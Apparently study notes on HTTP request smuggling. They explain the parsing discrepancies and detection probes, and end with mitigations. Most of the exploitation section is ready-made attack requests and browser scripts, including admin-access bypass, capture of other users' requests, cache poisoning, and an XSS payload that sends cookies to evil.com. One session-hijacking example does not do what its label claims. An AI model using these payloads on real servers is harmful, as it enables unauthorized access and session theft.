## HTTP Request Smuggling

- **What it is**
  - A technique for interfering with how web applications process sequences of HTTP requests
  - Exploits discrepancies in request handling between front-end and back-end servers
  - Allows attackers to "smuggle" requests to the back-end server through the front-end
  - Can lead to bypassing security controls, gaining unauthorized access, and compromising other users
  - Often found in multi-server architectures where front-end servers (load balancers, reverse proxies) forward requests to back-end servers
  - Particularly critical in shared hosting environments

- **How vulnerabilities arise**
  
  - **HTTP/1.1 ambiguities in request length specification**
    - Two ways to specify HTTP message length:
      - `Content-Length` header: Specifies the exact length of the message body in bytes
      - `Transfer-Encoding: chunked` header: Message body contains chunks with their own length indicators
    - HTTP/1.1 specification states that if both are present, `Content-Length` should be ignored
    - In practice, different servers implement this requirement differently
    - Front-end and back-end servers may disagree on request boundaries
  
  - **Common server configurations that lead to vulnerabilities**
    - Front-end uses `Content-Length`, but back-end uses `Transfer-Encoding` (CL.TE)
    - Front-end uses `Transfer-Encoding`, but back-end uses `Content-Length` (TE.CL)
    - Both use `Transfer-Encoding`, but one can be tricked into not processing it (TE.TE)
    - HTTP/2 downgrading issues where front-end accepts HTTP/2 but translates to HTTP/1.1 for back-end
    - Some servers don't support `Transfer-Encoding` header at all
    - Some servers can be induced to ignore `Transfer-Encoding` when obfuscated

- **Types of HTTP request smuggling vulnerabilities**
  
  - **CL.TE (Content-Length front, Transfer-Encoding back)**
    - Front-end server uses `Content-Length` to determine request length
    - Back-end server uses `Transfer-Encoding: chunked`
    - Attacker crafts request where these interpretations conflict
    - Example attack request:
      ```http
      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Length: 13
      Transfer-Encoding: chunked

      0

      SMUGGLED
      ```
    - Front-end sees 13-byte body (up to end of "SMUGGLED")
    - Back-end processes chunked encoding, treats "0" as end of request
    - "SMUGGLED" remains unprocessed and becomes the start of the next request
  
  - **TE.CL (Transfer-Encoding front, Content-Length back)**
    - Front-end server uses `Transfer-Encoding: chunked`
    - Back-end server uses `Content-Length`
    - Example attack request:
      ```http
      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Length: 3
      Transfer-Encoding: chunked

      8
      SMUGGLED
      0

      ```
    - Front-end processes chunked encoding (8-byte chunk plus 0-byte terminator)
    - Back-end uses `Content-Length: 3`, which only reaches "8\r\n"
    - "SMUGGLED\r\n0\r\n\r\n" remains unprocessed and becomes the start of the next request
  
  - **TE.TE (Transfer-Encoding obfuscation)**
    - Both front-end and back-end support `Transfer-Encoding`, but one can be tricked with obfuscation
    - Relies on implementation differences in HTTP parsing
    - Example attack request (depends on specific server behavior):
      ```http
      POST / HTTP/1.1
      Host: vulnerable-website.com
      Content-Length: 13
      Transfer-Encoding: chunked
      Transfer-encoding: xchunked

      0

      SMUGGLED
      ```
    - Server that processes the obfuscated header acts like the TE in CL.TE or TE.CL scenario
  
  - **HTTP/2-related vulnerabilities**
    - H2.CL: HTTP/2 front-end with HTTP/1.1 back-end using `Content-Length`
    - H2.TE: HTTP/2 front-end with HTTP/1.1 back-end using `Transfer-Encoding`
    - Request smuggling via HTTP/2 message length inconsistencies
    - HTTP/2 downgrading issues where front-end accepts HTTP/2 but translates to HTTP/1.1 for back-end

- **Identifying HTTP request smuggling vulnerabilities**
  
  - **Manual detection techniques**
    
    - **Time-delay technique**
      - Send a request that should cause a time delay if smuggling works
      - Example CL.TE probe:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 35
        Transfer-Encoding: chunked

        0

        GET /sleep/10 HTTP/1.1
        X-Ignore: X
        ```
      - If the next request is delayed by 10 seconds, the site is vulnerable
    
    - **Confirm vulnerability using differential responses**
      - Send a request that causes a different response to the next request
      - Example CL.TE probe:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 49
        Transfer-Encoding: chunked

        0

        GET /404resource HTTP/1.1
        Host: vulnerable-website.com
        ```
      - If the next request returns a 404, the site is vulnerable
    
    - **Testing for TE.CL vulnerabilities**
      - Example TE.CL probe:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 4
        Transfer-Encoding: chunked

        5c
        GPOST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0

        ```
      - If an unexpected 404 or error response is received, the site might be vulnerable
    
    - **Testing for obfuscated Transfer-Encoding**
      - Try various obfuscation techniques:
        ```http
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked
        Transfer-Encoding
        : chunked
        ```
  
  - **Automated detection tools**
    - Burp Suite Professional Scanner
    - Burp Repeater with "Update Content-Length" option disabled
    - HTTP Request Smuggler Burp extension
    - Testing HTTP/2 requires using Burp's HTTP/2 capabilities by switching protocols

- **Exploiting HTTP request smuggling vulnerabilities**
  
  - **Bypassing security controls**
    
    - **Accessing admin functionality**
      - Smuggle a request to admin pages from an internal/whitelisted IP
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 59
        Transfer-Encoding: chunked

        0

        GET /admin HTTP/1.1
        Host: vulnerable-website.com
        X-Original-IP: 127.0.0.1
        ```
    
    - **Revealing request headers**
      - Smuggle a request that captures headers from subsequent requests
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 70
        Transfer-Encoding: chunked

        0

        GET / HTTP/1.1
        Host: vulnerable-website.com
        X-API-Key: ${YOUR-API-KEY}
        ```
    
    - **Bypassing front-end security controls**
      - Bypass WAF or other security mechanisms on the front-end
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 65
        Transfer-Encoding: chunked

        0

        GET /admin/delete?user=carlos HTTP/1.1
        Host: vulnerable-website.com
        ```
  
  - **Capturing user requests and responses**
    
    - **Capturing request smuggling (CL.TE)**
      - Smuggle a request that captures parts of another user's request
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 130
        Transfer-Encoding: chunked

        0

        POST /capture-data HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 30

        data=
        ```
      - The next user's request will be appended to the "data=" parameter
    
    - **Response queue poisoning (TE.CL)**
      - Cause the back-end to respond to a smuggled request, shifting all responses
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 3
        Transfer-Encoding: chunked

        8
        GET /404 HTTP/1.1
        Host: vulnerable-website.com

        0

        ```
      - Next user will receive a 404 response to their legitimate request
    
    - **Web cache poisoning**
      - Combine request smuggling with web cache poisoning
      - Smuggle a request that causes a cacheable response
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 93
        Transfer-Encoding: chunked

        0

        GET /home HTTP/1.1
        Host: vulnerable-website.com
        X-Forwarded-Host: evil.com

        ```
      - This might poison the cache entry for /home with an XSS payload
  
  - **Session hijacking and user compromising**
    
    - **Capturing user cookies and session tokens**
      - Smuggle a request that sends cookies to an attacker-controlled endpoint
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 150
        Transfer-Encoding: chunked

        0

        GET / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 50

        Cookie: session=VICTIM-SESSION-TOKEN

        GET /
        ```
    
    - **Performing XSS attacks**
      - Smuggle a request that plants an XSS payload in a response
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 170
        Transfer-Encoding: chunked

        0

        GET /post/comment HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 400

        comment=<script>document.location='https://evil.com/'+document.cookie</script>&postId=1
        ```

- **Advanced HTTP request smuggling techniques**
  
  - **HTTP/2-based request smuggling**
    
    - **H2.CL vulnerabilities**
      - Front-end speaks HTTP/2, back-end uses HTTP/1.1 with `Content-Length`
      - HTTP/2 doesn't use Content-Length for message framing
      - Attack by adding a `content-length` header that gets passed to the back-end during downgrading
    
    - **H2.TE vulnerabilities**
      - Front-end speaks HTTP/2, back-end uses HTTP/1.1 with `Transfer-Encoding`
      - HTTP/2 downgrading passes `transfer-encoding: chunked` to the back-end
      - Attack by manipulating the HTTP/2 message body to create invalid chunked encoding
    
    - **Request smuggling via CRLF injection**
      - Inject newlines in HTTP/2 pseudo-headers that become headers in HTTP/1.1
      - Example:
        ```
        :method: POST
        :path: /
        :authority: vulnerable-website.com
        :scheme: https
        content-type: application/x-www-form-urlencoded
        content-length: 0

        GET /admin HTTP/1.1
        Host: vulnerable-website.com
        ```
  
  - **CL.0 vulnerabilities**
    
    - **Front-end uses Content-Length, back-end ignores message body**
      - Back-end treats requests without `Transfer-Encoding` or `Content-Length` as end-of-request
      - Attacker sends request with a body containing a complete smuggled request
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 53

        GET /admin HTTP/1.1
        Host: vulnerable-website.com

        X
        ```
    
    - **Exploiting via GET requests**
      - Some servers allow message bodies in GET requests
      - Example:
        ```http
        GET / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 53

        GET /admin HTTP/1.1
        Host: vulnerable-website.com

        X
        ```
  
  - **Multiple front-end servers (Request tunneling)**
    
    - **Chaining request smuggling vulnerabilities**
      - Chain vulnerable front-end servers to smuggle requests to back-ends
      - Works even if the connection to the back-end is reset between requests
      - Example first request (to Front-end 1):
        ```http
        POST https://vulnerable-website.com/ HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 130
        Transfer-Encoding: chunked

        0

        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 40
        Transfer-Encoding: chunked

        0

        GET /admin HTTP/1.1
        Host: vulnerable-website.com
        ```
    
    - **Smuggling between WebSockets**
      - Exploit request smuggling to hijack WebSocket connections
      - Smuggle a fake WebSocket handshake request
      - Example:
        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 200
        Transfer-Encoding: chunked

        0

        GET /chat HTTP/1.1
        Host: vulnerable-website.com
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: aaaaaaaaaaaaaaaaaaaaaa==
        Sec-WebSocket-Version: 13

        ```

- **Browser-powered request smuggling**
  
  - **Client-side desync attacks**
    
    - **Triggering with malformed headers**
      - Create an HTML page that sends a request with a body but no `Content-Length`
      - Example:
        ```html
        <form action="https://vulnerable-website.com/" method="POST" id="form">
        <input type="hidden" name="csrf" value="csrf-token">
        </form>
        <script>
        document.getElementById('form').submit();
        fetch('https://vulnerable-website.com/', {
          method: 'POST',
          body: 'GET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n',
          mode: 'no-cors',
          credentials: 'include'
        });
        </script>
        ```
    
    - **Socket poisoning via dangling Content-Length**
      - Send a request with an excessive `Content-Length` that the server processes partially
      - Remaining bytes are interpreted as the start of the next request
      - Example:
        ```javascript
        fetch('https://vulnerable-website.com/', {
          method: 'POST',
          body: 'x'.repeat(1024*1024) + '\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n',
          mode: 'no-cors',
          credentials: 'include'
        });
        ```
  
  - **Cross-site request smuggling**
    
    - **Victim-initiated request smuggling**
      - Create a malicious site that causes a victim's browser to poison their own connection
      - Example:
        ```html
        <script>
        fetch('https://vulnerable-website.com/', {
          method: 'POST',
          body: '0\r\n\r\nGET /deliver-flag?cookie=' + document.cookie + ' HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n',
          mode: 'no-cors',
          credentials: 'include'
        }).then(() => {
          location = 'https://vulnerable-website.com/';
        });
        </script>
        ```
    
    - **Exploiting browser connection reuse**
      - Browsers reuse connections for subsequent requests to the same origin
      - Poison a connection and then trigger a follow-up request
      - Example:
        ```html
        <script>
        // Poison the connection
        fetch('https://vulnerable-website.com/', {
          method: 'POST',
          body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n',
          mode: 'no-cors',
          credentials: 'include'
        }).then(() => {
          // Next request will be smuggled to /admin
          location = 'https://vulnerable-website.com/';
        });
        </script>
        ```

- **Request smuggling prevention**
  
  - **Server-side mitigations**
    
    - **Using HTTP/2 end-to-end**
      - HTTP/2 uses a single, robust mechanism for specifying request length
      - Eliminates ambiguities that enable request smuggling
      - Disable HTTP downgrading if possible
    
    - **Normalize ambiguous requests**
      - Front-end server should normalize or reject ambiguous requests
      - Reject requests with both `Content-Length` and `Transfer-Encoding` headers
      - Close TCP connections when rejecting ambiguous requests
    
    - **Consistent header handling**
      - Both front-end and back-end should handle headers in the same way
      - Implement strict HTTP parsing using well-tested parsers
      - Validate HTTP requests against RFC specifications
      - Reject requests with:
        - Duplicate or conflicting headers
        - Malformed headers or chunked encoding
        - Unusual whitespace or line breaks
    
    - **Disable backend connection reuse**
      - Create a new back-end connection for each front-end connection
      - Increases resource usage but prevents request queue poisoning
      - Not effective against request tunneling attacks
    
    - **Implement strict HTTP validation**
      - Reject requests with newlines in headers
      - Reject requests with spaces in the request method
      - Reject requests with unusual characters in headers
  
  - **Application-level mitigations**
    
    - **Use strong session handling**
      - Implement proper session validation for all sensitive actions
      - Require CSRF tokens for state-changing actions
      - Don't rely solely on HTTP headers for authentication/authorization
    
    - **Implement content security measures**
      - Use Content-Security-Policy (CSP) to mitigate XSS risks
      - Set SameSite=Strict on cookies to protect against CSRF
      - Use security headers like X-Frame-Options, X-Content-Type-Options
    
    - **Validate and sanitize all inputs**
      - Don't trust any part of the HTTP request
      - Implement proper input validation for all parameters
      - Sanitize and encode outputs to prevent XSS
